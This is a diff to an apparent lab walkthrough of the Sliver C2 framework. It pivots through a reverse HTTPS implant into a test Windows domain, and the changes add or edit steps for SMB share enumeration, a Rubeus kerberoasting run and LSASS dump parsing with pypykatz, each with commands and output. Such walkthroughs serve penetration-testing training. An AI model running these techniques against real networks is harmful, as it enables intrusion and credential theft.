@@ -25,7 +25,7 @@ Basic test lab
 > Windows DC 2016 with Defender AV enabled and up-to-date (192.168.1.167)
 
 The Kali Linux box can't reach the network 192.168.1.0/24. 
-To be able to reach the machines located in the network 192.168.1.0/24 we will execute a SLIVER session (reverse HTTPS shell with a proxy socks) 
+To be able to reach the machines located in the network 192.168.1.0/24 we will start a SLIVER implant (reverse HTTPS shell with a proxy socks) 
 on the Windows 10 laptop to pivot and then attack the machines located in the network 192.168.1.0/24.
 
 
@@ -385,10 +385,11 @@ socks5  127.0.0.1 1081
                
                
 =====================================================================================================================================================
-PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot into and attack the network '192.168.1.0/24'
+PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot and then attack the machines located 
+               in the network 192.168.1.0/24.
 =====================================================================================================================================================
 
-without using Proxychains and the SLIVER tunnel, the network traffic is filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
+without using Proxychains and the SLIVER session, the network traffic is filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/SLiver-C2$ nmap -Pn -sT -p 3389 192.168.1.113,167
@@ -456,9 +457,10 @@ company\chuck.norris.adm
 C:\>exit
 
 
-============================================================================================================================================
-PoC - Step 8 - Use the SLIVER post-exploitation modules and extensions to pivot into and attack the network '192.168.1.0/24'
-============================================================================================================================================
+=======================================================================================================================================
+PoC - Step 8 - Use the SLIVER post-exploitation modules and the 'ARMORY' extensions to pivot and then attack the machines located 
+               in the network 192.168.1.0/24
+=======================================================================================================================================
 
 There are many post-exploitation modules available with the SLIVER C2 framework.
 
@@ -677,6 +679,7 @@ Sub Commands:
 [*] Active session BOILING_LIVER (12d24a56)
 
 
+[server] sliver (BOILING_LIVER) > 
 [server] sliver (BOILING_LIVER) > sharpmapexec ntlm smb /user:chuck.norris.adm /password:<SNIP> /domain:company /computername:192.168.1.167 /m:shares
 
 [*] sharpmapexec output:
@@ -701,6 +704,41 @@ ntlmsmb
     [-]NETLOGON
     [-]SYSVOL
 
+
+[server] sliver (BOILING_LIVER) > 
+[server] sliver (BOILING_LIVER) > rubeus kerberoast /creduser:"company.work\chuck.norris.adm" /credpassword:<SNIP> /domain:company.work /dc:192.168.1.167 /nowrap
+
+[*] rubeus output:
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.1 
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : company.work
+[*] Searching path 'LDAP://192.168.1.167/DC=company,DC=work' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 5
+
+
+[*] SamAccountName         : svc_vulscanner
+[*] DistinguishedName      : CN=svc vulnscanner,CN=Users,DC=company,DC=work
+[*] ServicePrincipalName   : DC1/svc_vulnscanner.company.work:8080
+[*] PwdLastSet             : 24/08/2022 21:21:41
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+
+ [X] Error during request for SPN DC1/svc_vulnscanner.company.work:8080@company.work :
+<SNIP>
 
 
 [server] sliver (BOILING_LIVER) > ps
@@ -754,7 +792,7 @@ python3 -m pypykatz lsa minidump memorydump
 
 [server] sliver (BOILING_LIVER) > ls
 
-C:\Users\Administrator.PO718687\Downloads (7 items, 445.7 MiB)
+C:\Users\Administrator\Downloads (7 items, 445.7 MiB)
 ==============================================================
 -rw-rw-rw-  desktop.ini                      282 B      Tue Apr 20 19:02:20 +0100 2021
 -rw-rw-rw-  memorydump                       14.4 MiB   Wed Jan 04 18:11:06 +0100 2023
@@ -810,6 +848,4 @@ luid 678126503
         == DPAPI [286b63a7]==
                 luid 678126503
 <SNIP>
-
-
 
